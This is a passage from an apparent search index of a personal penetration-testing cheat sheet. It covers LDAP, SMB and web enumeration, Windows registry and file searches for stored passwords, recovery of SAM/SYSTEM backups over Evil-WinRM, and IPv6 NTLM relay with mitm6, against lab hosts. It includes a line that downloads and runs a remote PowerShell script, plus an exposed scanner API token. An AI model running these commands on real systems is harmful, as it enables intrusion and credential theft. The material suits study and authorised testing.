\"&lt;BIND_DN&gt;\" -w \"&lt;PASSWORD&gt;\" -b \"&lt;BASE_DN&gt;\"\n</code></pre> <p><code>-D &lt;BIND_DN&gt;</code>: username like CN=Administrator,CN=Users,DC=example,DC=com <code>-w &lt;PASSWORD&gt;</code>: The password for the bind DN</p> <p>To retrieve filtered entries</p> <pre><code>ldapsearch -H \"ldap://&lt;TARGET_IP&gt;\" -x -D \"&lt;BIND_DN&gt;\" -w \"&lt;PASSWORD&gt;\" -b \"&lt;BASE_DN&gt;\" \"ObjectClass=&lt;OBJECT&gt;\"\n\nldapsearch -H ldap://10.10.11.45 -x -D \"P.Rosa@vintage.htb\" -w \"Rosaisbest123\" -b \"DC=vintage,DC=htb\" \"(objectClass=user)\" sAMAccountName memberOf\n</code></pre> <p>Operators</p> <pre><code># AND\nldapsearch &lt;previous_options&gt; \"(&amp;(&lt;condition_1&gt;)(&lt;condition_2&gt;)...)\"\n$ ldapsearch &lt;previous_options&gt; \"(&amp;(objectclass=account)(uid=john))\"\n\n# OR\nldapsearch &lt;previous_options&gt; \"(|(&lt;condition_1&gt;)(&lt;condition_2&gt;)...)\"\n$ ldapsearch &lt;previous_options&gt; \"(|(objectclass=account)(objectclass=organizationalRole))\"\n\n# Negation\nldapsearch &lt;previous_options&gt; \"(!(&lt;condition_1&gt;)(&lt;condition_2&gt;)...)\"\n$ ldapsearch &lt;previous_options&gt; \"(!(cn=john))\"\n</code></pre> <pre><code>bloodhound-python -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;  -ns &lt;TARGET_IP&gt; -c all\nbloodhound-python -d LAB.ENTERPRISE.THM -u bitbucket -p 'littleredbucket'  -ns 10.10.214.253 -c all\n</code></pre> <pre><code>ldapdomaindump ldap://&lt;DOMAIN&gt;\nldapdomaindump ldap://dc01.vintage.htb\n\n# Standard enumeration with credential\nusername='domain.tld\\username'\npassword='password'\noutput_dir='./loot/ldap'\nldapdomaindump -u $username -p $password -o $output_dir dc-ip-address\n</code></pre>"},{"location":"pentest/enumeration/ports/69/","title":"69","text":""},{"location":"pentest/enumeration/ports/69/#trivial-file-transfer-protocol-tftp","title":"Trivial File Transfer Protocol (TFTP)","text":"<p>To connect to TFTP</p> <pre><code>tftp \"$IP\"\n</code></pre> <p>Default TFTP root directory </p> <pre><code>/var/lib/tftpboot\n</code></pre>"},{"location":"pentest/enumeration/ports/79/","title":"79","text":""},{"location":"pentest/enumeration/ports/79/#finger","title":"Finger","text":"<pre><code>./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t \"$IP\"\n./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.128.112 \n</code></pre>"},{"location":"pentest/enumeration/ports/80%2C443/","title":"80,443","text":""},{"location":"pentest/enumeration/ports/80%2C443/#hypertext-transfer-protocol-http-hypertext-transfer-protocol-secure-https","title":"Hypertext Transfer Protocol (HTTP), Hypertext Transfer Protocol Secure (HTTPS)","text":"<pre><code>nmap -p80 --script=\"http-enum\" &lt;TARGET_IP&gt;\n</code></pre>"},{"location":"pentest/enumeration/ports/873/","title":"873","text":""},{"location":"pentest/enumeration/ports/873/#remote-sync-rsync","title":"Remote Sync (Rsync)","text":"<p>connect to a remote host and copy files from a publicly accessible rsync module</p> <pre><code>rsync -avh rsync://&lt;REMOTE_IP&gt;/&lt;SHARE_NAME&gt;\nrsync -avh rsync://10.129.228.37/public                          \nreceiving incremental file list\ndrwxr-xr-x          4.10K 2022/10/24 18:02:23 .\n-rw-r--r--             33 2022/10/24 17:32:03 flag.txt\n\nrsync -avh rsync://&lt;REMOTE_IP&gt;/&lt;SHARE_NAME&gt; &lt;LOCAL_DIRECTORY&gt;\nrsync -avh rsync://10.129.228.37/public /home/kali/htblabs/synced\n</code></pre>"},{"location":"pentest/enumeration/wapp/cicd/","title":"CI/CD","text":""},{"location":"pentest/enumeration/wapp/cicd/#_1","title":"CI/CD","text":""},{"location":"pentest/enumeration/wapp/cicd/#jenkins","title":"JENKINS","text":""},{"location":"pentest/enumeration/wapp/cicd/#files","title":"Files","text":"<pre><code>/var/lib/Jenkins/secrets/initialAdminPassword\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/","title":"CMS","text":""},{"location":"pentest/enumeration/wapp/cms/#files","title":"FILES","text":"<pre><code>wp-config.php\n/etc/apache2/sites-available/default-ssl.conf\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/#wordpress","title":"WORDPRESS","text":""},{"location":"pentest/enumeration/wapp/cms/#automated","title":"Automated","text":"<pre><code>wpscan --url \"http://$DOM\" --enumerate u,t,ap --api-token WLvarYIr8Fwp1jAHVNH5JGDapSeP3CDRC7HMizXe3Yk\n</code></pre> <pre><code>wpscan --url \"http://$DOM\" -U \"$USER\" -P /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/#manual","title":"Manual","text":"<pre><code>curl -k -s https://192.168.102.148:12380/blogblog/wp-content/plugins/ |html2text\ncurl -k -s 'https://192.168.102.148:12380/blogblog/wp-content/uploads/789966606.jpeg' --output wp-config.php\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/#joomla","title":"JOOMLA","text":"<p>juumla</p> <pre><code>python3 main.py -u \"http://$DOM\"\n</code></pre> <p>joomscan</p> <pre><code>perl joomscan.pl -u \"http://$DOM\"\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/#drupal","title":"DRUPAL","text":"<p>droopescan</p> <pre><code>sudo apt-get install python-pip\npip install droopescan\ndroopescan scan drupal -u \"http://$DOM\" -t 32\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/#magento","title":"MAGENTO","text":"<p>magescan</p> <pre><code>php magescan.phar -vvv scan:all \"$IP\" &gt; output\n</code></pre>"},{"location":"pentest/enumeration/wapp/cms/#backdrop","title":"BACKDROP","text":"<ul> <li>Backdrop CMS 1.27.1 - Authenticated Remote Command Execution</li> </ul>"},{"location":"pentest/enumeration/wapp/fuzzing/","title":"Fuzzing","text":""},{"location":"pentest/enumeration/wapp/fuzzing/#feroxbuster","title":"feroxbuster","text":"<pre><code>feroxbuster -u \"http://$IP\" -w \"$dirmedium\" -x php,html,txt --filter-status 404,400,503 --depth 1 -o fm.txt\n</code></pre> <pre><code>feroxbuster -k -u \"https://$IP\" -w \"$dirmedium\" -x php,html,txt --filter-status 404,400,503 --depth 1 -o fm443.txt\n</code></pre>"},{"location":"pentest/enumeration/wapp/fuzzing/#gobuster","title":"gobuster","text":"<pre><code>gobuster dir -u \"http://$IP\" -w \"$dirmedium\" -o g.txt\n</code></pre>"},{"location":"pentest/enumeration/wapp/fuzzing/#dirsearch","title":"dirsearch","text":"<pre><code>dirsearch -u \"http://$IP\" -t 50 -i 200 -o ds.txt\n</code></pre>"},{"location":"pentest/enumeration/wapp/subdomain/","title":"Subdomain","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://FUZZ.$DOM\"\n</code></pre>"},{"location":"pentest/enumeration/wapp/virtual_host/","title":"Virtual Host","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://$DOM\" -H \"Host: FUZZ.$DOM\"\n</code></pre> <pre><code>wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 -H \"Host:FUZZ.$DOM\" \"http://$DOM\"\n</code></pre>"},{"location":"pentest/enumeration/windows/checklist/","title":"Checklist","text":""},{"location":"pentest/enumeration/windows/checklist/#enumeration","title":"Enumeration","text":"<ul> <li> Ports, Services</li> <li> Users, Groups</li> <li> Kerberos<ul> <li> Service Principal Name (SPN)</li> <li> Users with DONT_REQUIRE_PREAUTH (AS-REP Roasting)</li> </ul> </li> </ul>"},{"location":"pentest/enumeration/windows/checklist/#foothold","title":"Foothold","text":"<ul> <li> Users, Groups</li> <li> Privileges</li> <li> Files, Registries</li> <li> System</li> <li> Services</li> <li> Group Policy Object (GPO)</li> <li> Access Control List (ACL)</li> <li> Environment Variables</li> </ul>"},{"location":"pentest/enumeration/windows/filedir/","title":"Files","text":"<pre><code>C:\\sysprep.inf  \nC:\\sysprep\\sysprep.xml  \nC:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\nC:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\nC:\\Windows\\System32\\inetsrv\\config\\schema\\ASPNET_schema.xml\n\n\ud83d\udd0d IIS configs\nC:\\inetpub\\logs\\LogFiles\\\nC:\\inetpub\\wwwroot\\web.config\nC:\\inetpub\\wwwroot\\&lt;WAPP&gt;\\web.config\n\n\ud83d\udd0d Saved RDP creds\nC:\\Users\\&lt;USER&gt;\\Documents\\Default.rdp\n</code></pre> <p>Search for hidden files</p> <pre><code>dir /a C:\\\ndir /R or more &lt;FILE&gt; (Alternate Data stream)\n\nGet-ChildItem -Path C:\\ -Force -Recurse\nGet-ChildItem -Path C:\\ -Force -Recurse | Where-Object { $_.Attributes -match 'Hidden' }\n</code></pre> <p>Search for files for potential \"password\"</p> <pre><code>Get-ChildItem -Path C:\\ -Include *.txt,*.xml,*.config -Recurse | Select-String -Pattern \"password\"\n\ndir /s *pass* == *cred* == *vnc* == *.config*\nfindstr /si password *.txt *.ini *.config\nfindstr /spin \"password\" *.*\n</code></pre> <p>Search for files in <code>C:\\Users</code></p> <pre><code>dir C:\\Users\\*.txt C:\\Users\\*.pdf C:\\Users\\*.xls C:\\Users\\*.xlsx C:\\Users\\*.doc C:\\Users\\*.docx /s /b\n\ngci /users -recurse -ea SilentlyContinue -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx\n\nGet-ChildItem -Recurse C:\\Users\\*\\Desktop \nGet-ChildItem -Recurse C:\\Users\\*\\Documents \nGet-ChildItem -Recurse C:\\Users\\*\\Downloads\nGet-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>Display History and History file path</p> <pre><code>Get-History\n(Get-PSReadlineOption).HistorySavePath\n</code></pre> <p>Check common registries</p> <pre><code>\ud83d\udd13 Check for AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n\ud83d\udd10 Auto-login credentials\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon\n\n\ud83d\udca3 Auto-run executables (startup persistence)\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run AutoRun executables\"\n\n\ud83d\udee0\ufe0f Services (for potential unquoted paths)\nreg query HKLM\\SYSTEM\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\n\n\ud83d\udd0d Look for stored passwords\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;SERVICE&gt;\"\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\nreg query \"HKCU\\Software\\&lt;VENDOR&gt;\\&lt;APP&gt;\\Sessions\"\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\n\n\ud83d\udd27 Installed software\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\n\n\ud83d\udce6 App Paths (sometimes abused for persistence)\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\"\n\n\ud83e\uddea Environment variables (can include PATH injection vectors)\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\"\nreg query \"HKCU\\Environment\"\n\n\ud83d\udccd Shell (logon scripts or shell replacements)\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"\n</code></pre>"},{"location":"pentest/enumeration/windows/gpo/","title":"Group Policy Object","text":""},{"location":"pentest/enumeration/windows/gpo/#what-is-group-policy-object","title":"What is Group Policy Object?","text":"<p>GPO is a collection of Group Policy settings that defines what a system will look like and how it will behave for a defined group of users</p> <p>GPOs consist of the following two components: - Group Policy Container (GPC) - this is the\u00a0LDAP part of the GPO\u00a0and contains its attributes - Group Policy Template (GPT) - this is located in <code>Sysvol</code> and contains the actual GPO settings When a client (user or computer) processes the GPO settings, the following process takes place: 1. The client retrieves the <code>gpLink</code> attribute of all containers in its directory structure.\u00a0<code>GpLink</code> contains the LDAP path of the GPOs that must be applied. 2. The client retrieves a number of attributes associated with each GPO. One of these attributes is\u00a0<code>gPCFileSysPath</code>\u00a0which\u00a0contains the location of the actual GPO settings in SYSVOL. 3. The client establishes an SMB connection to the location pointed by <code>gPCFileSysPath</code>. 4. The GPO settings are retrieved and applied by the client.</p>"},{"location":"pentest/enumeration/windows/gpo/#how-to-enumerate","title":"How to enumerate ?","text":"<p>To retrieve a specific GPO</p> <pre><code>Get-GPO -name &lt;GPO&gt;\nGet-GPO -name \"Default Domain Policy\"\nGet-GPO -name \"Default Domain Controllers Policy\"\n</code></pre> <p>Search for permissions on GPO for current user</p> <pre><code>Get-GPPermission -guid &lt;GUID&gt; -targettype user -targetname &lt;username&gt;\n\nGet-GPPermission -guid 31b2f340-016d-11d2-945f-00c04fb984f9 -targettype user -targetname anirudh\n</code></pre>"},{"location":"pentest/enumeration/windows/network/","title":"Network","text":"<p>Show current IP configuration</p> <pre><code>ipconfig\n</code></pre> <p>Show detailed IP configuration information</p> <pre><code>ipconfig /all\n</code></pre> <p>Show ARP table entry</p> <pre><code>arp -a\n</code></pre> <p>Show current routing table</p> <pre><code>route print\n</code></pre> <p>Show all network connection and listening port with PID</p> <pre><code>netstat -ano\nnetstat -nao | findstr /i \"Local listening established\"\n</code></pre>"},{"location":"pentest/enumeration/windows/priv/","title":"Privileges","text":"<p>User privilege</p> <pre><code>whoami /priv\n</code></pre> <p>Check files/directories privilege</p> <pre><code>icacls &lt;FILE/DIR&gt;\nGet-Acl -Path &lt;PATH_NAME&gt; | fl\nGet-Acl -Path \"C:\\Program Files (x86)\\Zero Tier\\Zero Tier One\\\" | Format-List\n</code></pre> <p>Check Object privilege</p> <pre><code>Get-ObjectAcl -Identity &lt;Object&gt; | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights\nGet-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights\n</code></pre> <p>Check Service privilege</p> <pre><code>&lt;SERVICE&gt; | Get-ServiceAcl | select -ExpandProperty Access\n\nIEX (IWR http://10.8.101.15/WENUM/get-serviceacl.ps1 -UseBasicParsing);\"zerotieroneservice\" | Get-ServiceAcl | select -ExpandProperty Access\n</code></pre>"},{"location":"pentest/enumeration/windows/recyclebin/","title":"Recycle Bin","text":"<p>Access the Recycle Bin using the Shell COM object</p> <pre><code>$shell = New-Object -ComObject Shell.Application\n$rb = $shell.Namespace(10)\n</code></pre> <p>List items currently in the Recycle Bin</p> <pre><code>$rb.Items() | ForEach-Object { $_.Name }\n</code></pre> <p>Inspect file properties</p> <pre><code>$item = $rb.Items()\nPS C:\\&gt; $item\n\nApplication  : System.__ComObject\nParent       : System.__ComObject\nName         : wapt-backup-sunday.7z\nPath         : C:\\$RECYCLE.BIN\\S-1-5-21-2386970044-1145388522-2932701813-1103\\$RE2XMEG.7z\nGetLink      : \nGetFolder    : \nIsLink       : False\nIsFolder     : False\nIsFileSystem : True\nIsBrowsable  : False\nModifyDate   : 10/24/2024 9:16:29 PM\nSize         : 30416987\nType         : 7Z File\n</code></pre> <p>Get the current user's SID (Security Identifier)</p> <pre><code>$SID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value\n</code></pre> <p>Remarks: Each user has a separate folder inside the Recycle Bin Set the user-specific Recycle Bin path</p> <pre><code>$RecyclePath = \"C:\\`$Recycle.Bin\\$SID\"\n</code></pre> <p>List all deleted files in the user's Recycle Bin</p> <pre><code>Get-ChildItem -Path $RecyclePath -Force | Where-Object { $_.Name -like '$R*' }\n</code></pre> <p>Copy a deleted file from the Recycle Bin (use quotes!)</p> <pre><code>Copy-Item 'C:\\$Recycle.Bin\\&lt;UserSID&gt;\\$REXXXXX.ext' -Destination 'C:\\Path\\To\\Restore\\file.ext'\n</code></pre> <p>Alternatively: copy and download the file</p> <pre><code>cd 'C:\\$Recycle.bin\\S-1-5-21-1987495829-1628902820-919763334-1001'\n*Evil-WinRM* PS C:\\$Recycle.bin\\S-1-5-21-1987495829-1628902820-919763334-1001&gt; dir\n\n\n    Directory: C:\\$Recycle.bin\\S-1-5-21-1987495829-1628902820-919763334-1001\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        9/18/2020   7:28 PM          49152 sam.bak\n-a----        9/18/2020   7:28 PM       17457152 system.bak\n\n*Evil-WinRM* PS C:\\$Recycle.bin\\S-1-5-21-1987495829-1628902820-919763334-1001&gt; copy * C:\\Users\\Jareth\\Downloads\n\ndownload sam.bak\nInfo: Downloading C:\\Users\\Jareth\\Downloads\\sam.bak to sam.bak\nInfo: Download successful!\ndownload system.bak\nInfo: Downloading C:\\Users\\Jareth\\Downloads\\system.bak to system.bak\nInfo: Download successful!\n</code></pre>"},{"location":"pentest/enumeration/windows/system/","title":"System","text":"<p>Display detailed information about system's hardware, operating system, network configuration and installed updates</p> <pre><code>systeminfo\nsysteminfo | findstr /B /C:\"Host Name\" /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Network Card(s)\" /C:\"Hotfix(s)\"\n</code></pre> <p>Display all installed applications (32-bit and 64-bit)</p> <pre><code>Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n</code></pre> <p>Displays list of installed Windows updates (also known as Quick Fix Engineering updates or hotfixes), showing details like the update description, KB number, installation date, and more.</p> <pre><code>wmic qfe\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\nGet-HotFix | Select-Object Source, Description, HotFixID, InstalledOn\n</code></pre> <ul> <li><code>wmic</code>: This is the command-line interface for the Windows Management Instrumentation (WMI), allowing users to query system information, hardware, software, and other Windows management details.</li> <li><code>qfe</code>: This stands for Quick Fix Engineering, referring to a list of installed Windows updates, service packs, or hotfixes. When used, it queries and displays information about all the updates installed on the system.</li> </ul> <p>Retrieve a list of security updates applied to the system</p> <pre><code>Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq \"Security Update\" }\n</code></pre> <p>Displaycurrent Windows PATH environment variable</p> <pre><code>echo %PATH%\nGet-ChildItem Env:PATH\n</code></pre> <p>Display all environment variables</p> <pre><code>set\nGet-ChildItem Env:\n</code></pre> <p>Display all currently active processes</p> <pre><code>Get-Process\n\ntasklist\n</code></pre> <p>To retrieve information about all running processes on the system</p> <pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\nGet-CimInstance -ClassName Win32_Service | \nWhere-Object { \n    $_.PathName -and \n    $_.PathName -notlike 'C:\\Windows\\*' -and \n    $_.PathName -notmatch '\"' \n} | Select-Object Name, PathName\n\nGet-WmiObject Win32_Process | Select-Object Name, ProcessId, ExecutablePath\nGet-CimInstance Win32_Process | Select-Object Name, ProcessId, ExecutablePath\n</code></pre> <p>Note: <code>Get-WmiObject</code> is the older cmdlet that interacts with WMI, whereas <code>Get-CimInstance</code> is the newer cmdlet that interacts with CIM, which is more efficient and recommended for newer PowerShell scripts</p> <p>Display running services</p> <pre><code>Get-Service\n\nsc queryex type=service\ntasklist /SVC\nnet start\n</code></pre>"},{"location":"pentest/enumeration/windows/users/","title":"Users","text":"<pre><code>nxc smb &lt;TARGET_IP&gt; -u 'guest' -p '' --rid-brute\nnxc smb 10.10.191.87 -u 'guest' -p '' --rid-brute\n\nimpacket-lookupsid anonymous:@&lt;TARGET_IP&gt; | cut -d \" \" -f 2 &gt; usernames.txt\nimpacket-lookupsid anonymous:@10.10.191.87 | cut -d \" \" -f 2 &gt; usernames.txt\n\nrpcclient $&gt; querydispinfo\nrpcclient $&gt; enumdomusers\n\nenum4linux -a -u \"\" -p \"\" &lt;IP&gt; &amp;&amp; enum4linux -a -u \"guest\" -p \"\" &lt;IP&gt;\n</code></pre> <p>Current Logged-in User (Local)</p> <pre><code>whoami /all\nwhoami /priv\nwhoami /groups\n</code></pre> <p>Local User Accounts</p> <pre><code>net user\nGet-LocalUser\nGet-ADUser -Filter 'Name -like \"*&lt;PATTERN&gt;*\"' -Server &lt;DOMAIN_CONTROLLER&gt; | Format-Table Name, SamAccountName -AutoSize\n</code></pre> <p>Specific Local User Details</p> <pre><code>net user &lt;USERNAME&gt;\nGet-ADUser -Identity &lt;USERNAME&gt; -Server &lt;DOMAIN_CONTROLLER&gt; -Properties *\n</code></pre> <p>Domain User Accounts</p> <pre><code>net user /domain\nGet-NetUser\nGet-NetUser | select cn, pwdlastset, lastlogon\n</code></pre> <p>Domain Accounts with SPNs</p> <pre><code>Get-NetUser -SPN | select samaccountname,serviceprincipalname\n</code></pre> <p>SPN Users</p> <pre><code>setspn -L &lt;SERVICE_ACCOUNT&gt;       # Enumerate SPNs for a specific user account\nsetspn -Q */*                     # Query all SPNs in the domain (often maps to service accounts)\n</code></pre>"},{"location":"pentest/enumeration/windows/groups/elr/","title":"Event Log Readers","text":""},{"location":"pentest/enumeration/windows/groups/elr/#what-is-the-event-log-readers-group","title":"What is the Event Log Readers Group?","text":"<p>The Event Log Readers group in Windows is designed to allow its members to read the event logs on a system. This group typically includes users who need to monitor or analyze system and application events without granting them broader administrative privileges.</p> <p>Read Security Logs</p> <pre><code>PS C:\\&gt; wevtutil qe Security /rd:true /f:text | Select-String \"/user\"\n# Do same but from other user\nPS C:\\&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:ven17 /p:shrekislove | findstr \"/user\"\n\nGet-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\\users\\scripting\\logs.txt\n</code></pre>"},{"location":"pentest/enumeration/windows/groups/groups/","title":"Commands","text":"<p>Local Groups</p> <pre><code>net localgroup\nGet-LocalGroup\n</code></pre> <p>Members of a Local Group</p> <pre><code>net localgroup \"&lt;GROUP NAME&gt;\"\nGet-LocalGroupMember &lt;GROUP_NAME&gt;\n</code></pre> <p>Domain Groups</p> <pre><code>net group /domain\nGet-NetGroup\nGet-ADGroup -Identity &lt;GROUPNAME&gt; -Server &lt;DOMAIN_CONTROLLER&gt;\n</code></pre> <p>Note: - Members of Backup Operators can backup and restore all files on a computer, even those files they don't have permissions for - Members of Remote Desktop Users can access the system with RDP - Members of Remote Management Users can access it with WinRM</p> <p>Members of Domain Groups</p> <pre><code>net group \"&lt;GROUP NAME&gt;\" /domain\nGet-ADGroupMember -Identity &lt;GROUPNAME&gt; -Server &lt;DOMAIN_CONTROLLER&gt;\n</code></pre>"},{"location":"pentest/enumeration/windows/groups/laps/","title":"Local Administration Password Solution","text":""},{"location":"pentest/enumeration/windows/groups/laps/#todo-what-is-this-group-about","title":"TODO what is this group about?","text":"<p>Search for password </p> <pre><code>Get-ADComputer -Filter 'ObjectClass -eq \"computer\"' -Property *\n</code></pre> <p>LAPS dumper python script</p> <pre><code>\n</code></pre> <p>Refer to HTB TIMELAPSE</p>"},{"location":"pentest/enumeration/windows/groups/srvops/","title":"Server Operator","text":""},{"location":"pentest/enumeration/windows/groups/srvops/#what-is-the-server-operator-group","title":"What is the Server Operator Group?","text":"<p>A special user group with elevated privileges, typically used for managing servers and troubleshooting system issues. Members are responsible for tasks like monitoring performance, managing security, supporting users, installing updates, handling user accounts, and performing routine maintenance.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; net user anirudh\nUser name                    anirudh\nFull Name\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            11/19/2021 1:59:51 AM\nPassword expires             Never\nPassword changeable          11/20/2021 1:59:51 AM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   8/1/2024 6:10:08 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Remote Management Use\n                             *Server Operators\nGlobal Group memberships     *Domain Users\n</code></pre>"},{"location":"pentest/enumeration/windows/groups/wsus/","title":"WSUS","text":""},{"location":"pentest/enumeration/windows/groups/wsus/#todo-what-is-this-group-about","title":"TODO what is this group about?","text":""},{"location":"pentest/enumeration/windows/groups/wsus/#how-to","title":"How to ?","text":"<p>https://github.com/nettitude/SharpWSUS</p>"},{"location":"pentest/initial/ipv6/","title":"IPv6 DNS Takeover Attack","text":"<p>Perform an NTLM relay attack using IPv6</p> <pre><code>ntlmrelayx.py -6 -t ldaps://&lt;DC IP&gt; -wh &lt;FAKEWPAD HOSTNAME&gt; -l &lt;DIRECTORY NAME&gt;\nntlmrelayx.py -6 -t ldaps://10.0.0.225 -wh fakewpad.local -l lootme\n</code></pre> <p>Set up <code>mitm6</code></p> <pre><code>sudo mitm6 -d &lt;DOMAIN&gt;\nsudo mitm6 -d MARVEL.local\n</code></pre>"},{"location":"pentest/initial/ipv6/#mitigation","title":"Mitigation","text":"Methods Description Enhanced Information Block (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In) Prevents incoming DHCPv6 traffic to stop malicious configuration. Stops rogue DHCPv6 servers from altering client settings. Block (Inbound) Core Networking - Router Advertisement (ICMPv6-In) Blocks ICMPv6 Router Advertisements to prevent routing manipulation. Prevents attackers from redirecting traffic through malicious routes. Block (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out) Stops outgoing DHCPv6 traffic to block malicious configurations. Protects against clients receiving harmful configuration data. If WPAD is not used internally, disable WinHttpAutoProxySvc service Disables WPAD auto-discovery to prevent malicious proxy requests. Reduces risk of WPAD-related attacks if not in use. Enable both LDAP signing and LDAP channel binding Signs and binds LDAP traffic to prevent tampering and unauthorized relaying. Ensures LDAP data integrity and security against relay attacks. Move administrative users to the protected users group / Marking them as sensitive and cannot be delegated Moves high-privilege accounts to protected status to prevent delegation and impersonation. Shields sensitive accounts from being exploited through delegation attacks."},{"location":"pentest/initial/llmnr/","title":"Link-Local Multi Name Resolution Poisoning","text":""},{"location":"pentest/initial/llmnr/#netbios-vs-llmnr","title":"NetBIOS vs. LLMNR","text":"Feature NetBIOS LLMNR Purpose Provides network communication services, including name resolution and session management in legacy Windows environments. Resolves hostnames to IP addresses on a local network when DNS is not available. Usage Primarily used in older Windows networks for resource sharing and communication. Used in modern Windows environments for local name resolution. Protocol Type Legacy protocol with several services including NetBIOS Name Service (NBNS). Part of the Link-Local Multicast Name Resolution protocol suite. Name Resolution Uses NetBIOS Name Service (NBNS) to resolve names to IP addresses. Uses multicast to resolve names to IP addresses on the local network. Security Risks Vulnerable to NetBIOS spoofing attacks, where attackers impersonate services to intercept data. Vulnerable to LLMNR spoofing attacks, where attackers respond to queries with false information. Scope Operates on both local and remote networks, traditionally within Windows networks. Limited to local networks (link-local), generally within the same subnet. Modern Replacement Mostly replaced by DNS for name resolution and other modern network services. Often replaced by DNS or turned off in favor of more secure name resolution practices. Network Traffic Can generate significant traffic due to its broad use in legacy environments. Typically generates minimal traffic, only used for local name resolution."},{"location":"pentest/initial/llmnr/#how-llmnr-works","title":"How LLMNR works?","text":"Step Action Details Result Connect to Network Device connects to the network via DHCP Jane\u2019s laptop connects to a caf\u00e9\u2019s Wi-Fi, receives an IP address, subnet mask, default gateway, and DNS server addresses from the DHCP server. Jane\u2019s laptop is assigned an IP address like <code>192.168.1.15</code>. DNS Resolution Device queries DNS servers for external domain names Jane\u2019s laptop queries the DNS server at <code>8.8.8.8</code> for <code>www.example.com</code> to resolve it to an IP address. DNS server returns the IP address <code>93.184.216.34</code>. LLMNR Usage 